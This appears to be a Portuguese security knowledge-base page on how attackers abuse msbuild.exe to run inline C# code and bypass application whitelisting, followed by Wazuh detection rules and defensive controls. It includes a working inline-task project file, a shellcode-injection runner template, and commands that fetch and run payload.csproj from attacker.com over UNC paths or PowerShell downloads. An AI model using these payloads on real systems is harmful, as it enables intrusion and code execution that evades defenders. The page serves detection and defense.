# msbuild.exe

**Plataforma:** Windows (.NET Framework / Visual Studio)

**Categorias:** Execução de código, AWL Bypass, Compilação inline de C#

**MITRE ATT&CK:** T1127.001 (Trusted Developer Utilities Proxy Execution — MSBuild), T1036 (Masquerading)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Msbuild/

---

## O que é o msbuild.exe

O MSBuild (Microsoft Build Engine) é o sistema de build da Microsoft, responsável por compilar projetos .NET, C++, e outros tipos de projeto do ecossistema Microsoft. Está presente em sistemas com Visual Studio instalado, mas também em máquinas com apenas o .NET Framework ou o Build Tools instalado — o que inclui muitos servidores Windows de desenvolvimento e ambientes de CI/CD.

O MSBuild processa arquivos de projeto XML (`.csproj`, `.vbproj`, `.targets`) que definem tarefas de compilação. Esses arquivos de projeto suportam a definição de tarefas customizadas que executam código C# ou VB.NET inline diretamente durante o processo de build.

---

## Por que atacantes usam o msbuild.exe

O MSBuild é assinado pela Microsoft e frequentemente está na whitelist de ferramentas de desenvolvedor — tanto no AppLocker quanto em soluções de EDR mais simples. A capacidade de executar código C# inline em um arquivo XML é o vetor principal: o atacante cria um arquivo `.csproj` ou `.targets` contendo shellcode ou código C# completo, e o MSBuild o compila e executa sem criar nenhum executável adicional no disco.

---

## Técnicas de abuso

### Execução de código C# inline via arquivo de projeto

Esta é a técnica principal. Um arquivo de projeto XML com uma tarefa inline executará código C# quando o MSBuild processar o build.

O arquivo de projeto malicioso (`payload.csproj`):

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Attack">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Diagnostics;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;

          public class ClassExample : Task, ITask {
            public override bool Execute() {
              Process.Start("cmd.exe", "/c whoami > C:\\temp\\out.txt");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Execução:

```cmd
:: Executar arquivo de projeto malicioso
msbuild.exe payload.csproj

:: Especificar target explicitamente
msbuild.exe payload.csproj /target:Attack

:: Via caminho completo do MSBuild
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### Execução de shellcode via inline C#

O código inline pode incluir shellcode para injeção em memória:

```xml
<Code Type="Class" Language="cs">
  <![CDATA[
    using System;
    using System.Runtime.InteropServices;
    using Microsoft.Build.Framework;
    using Microsoft.Build.Utilities;

    public class ShellcodeRunner : Task, ITask {
      [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
      [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
      [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);

      public override bool Execute() {
        byte[] shellcode = new byte[] { /* shellcode aqui */ };
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
        return true;
      }
    }
  ]]>
</Code>
```

### Execução a partir de UNC path

```cmd
:: Arquivo de projeto armazenado em servidor remoto
msbuild.exe \\attacker.com\share\payload.csproj
msbuild.exe \\attacker.com@80\DavWWWRoot\payload.csproj
```

### Download e execução via PowerShell + MSBuild

```powershell
# Baixar arquivo de projeto e executar com MSBuild
(New-Object Net.WebClient).DownloadFile('http://attacker.com/payload.csproj', "$env:TEMP\update.csproj")
& 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe' "$env:TEMP\update.csproj"
```

---

## Técnicas de bypass e evasão

### Uso de extensão de arquivo diferente

```cmd
:: O MSBuild aceita qualquer arquivo XML com sintaxe válida, independente da extensão
msbuild.exe payload.xml
msbuild.exe payload.txt
msbuild.exe payload.log
```

### Variação de versão do .NET Framework

```cmd
:: MSBuild v3.5
C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe payload.csproj

:: MSBuild v4.0 (32 bits)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj

:: MSBuild v4.0 (64 bits)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

Regras que monitoram apenas um caminho específico podem ser contornadas usando outra versão do .NET instalada.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- msbuild.exe executado fora de contexto de IDE ou pipeline de CI/CD
- msbuild.exe processando arquivo de projeto em diretórios temporários ou de usuário
- msbuild.exe iniciando conexão de rede (Sysmon Event ID 3)
- msbuild.exe com parent process suspeito (cmd.exe sem contexto de build, PowerShell, wscript)
- msbuild.exe criando processos filhos inesperados (cmd.exe, powershell.exe)

**Indicadores de média relevância:**

- Arquivo `.csproj` ou `.targets` criado em diretório temporário por usuário não-desenvolvedor
- msbuild.exe executado por usuário sem necessidade operacional de desenvolvimento

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0202-lolbas_awl_bypass.xml -->

<!-- msbuild iniciando processo filho suspeito -->
<rule id="100322" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)msbuild\.exe$</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(cmd|powershell|wscript|cscript|rundll32|mshta)\.exe$</field>
  <description>msbuild.exe gerou processo filho suspeito — possivel execucao de codigo via inline task</description>
  <mitre>
    <id>T1127.001</id>
  </mitre>
</rule>

<!-- msbuild iniciando conexão de rede -->
<rule id="100323" level="13">
  <if_group>sysmon_event3</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)msbuild\.exe$</field>
  <description>msbuild.exe iniciando conexao de rede — possivel C2 ou download de payload via inline task</description>
  <mitre>
    <id>T1127.001</id>
  </mitre>
</rule>

<!-- msbuild executado fora de horário de trabalho ou por usuário não-desenvolvedor -->
<rule id="100324" level="10">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)msbuild\.exe$</field>
  <description>msbuild.exe executado — verificar contexto: usuario, horario e diretorio do arquivo de projeto</description>
  <mitre>
    <id>T1127.001</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Ambientes de desenvolvimento:** em máquinas de desenvolvedores, o msbuild é executado com frequência durante compilação de projetos. Filtre por máquinas inventariadas como estações de desenvolvimento e por usuários no grupo de desenvolvedores.

**Pipelines de CI/CD:** servidores de build (Jenkins, Azure DevOps Agent, TeamCity) executam msbuild constantemente. Filtre pelo usuário de serviço do agente de build e pelo diretório de trabalho do repositório.

---

## Proteção e controles defensivos

**Restringir msbuild a máquinas de desenvolvimento:** em servidores de produção e estações de usuários não-desenvolvedores, o msbuild raramente é necessário. Remova o Visual Studio Build Tools ou use AppLocker para bloquear msbuild.exe em máquinas onde não há necessidade de build.

**Monitorar criação de processos filhos por msbuild:** em ambientes onde msbuild é necessário, a criação de processos como cmd.exe ou powershell.exe como filhos do msbuild é altamente suspeita e deve gerar alerta imediato.

**WDAC com regras para trusted developer utilities:** o Windows Defender Application Control tem a categoria "Trusted Developer Tools" que inclui msbuild. Avaliar se essa categoria é necessária no perfil de cada tipo de máquina e desabilitá-la onde não for.

---

## Referências

- LOLBAS — msbuild.exe: https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
- MITRE ATT&CK T1127.001: https://attack.mitre.org/techniques/T1127/001/
